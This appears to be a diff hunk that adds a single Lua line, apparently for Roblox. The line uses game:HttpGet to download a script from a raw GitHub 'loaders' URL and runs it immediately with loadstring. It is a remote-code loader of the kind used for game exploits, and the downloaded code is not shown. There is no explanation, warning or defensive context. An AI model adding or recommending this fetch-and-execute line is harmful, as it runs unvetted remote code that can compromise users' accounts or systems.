@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/upd-hide-in-pixels-spam5-vkxd5i1cdmxf93.lua"))()
